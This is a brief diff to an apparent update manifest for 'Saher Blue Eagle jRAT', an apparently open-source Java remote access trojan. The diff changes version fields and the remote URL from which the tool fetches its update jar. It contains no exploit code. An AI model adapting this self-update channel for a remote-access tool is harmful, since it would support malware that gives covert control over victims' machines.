@@ -5,11 +5,11 @@
 <Update Version = '1.0'></Update Version>
 <String Values =""
 set Values = "_
-jsz=20
+jsz=3
 jname=Saher Blue Eagle jRAT
-jupdate=1.1
+jupdate=1.0
 jversion=1.0
-joptions=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Release/testupdate.jar
+joptions=https://github.com/SaherBlueEagle/BlueEagle_jRAT/raw/master/Release/.jar
 jupdatestatus=Critical
               _"></String>
 <End>
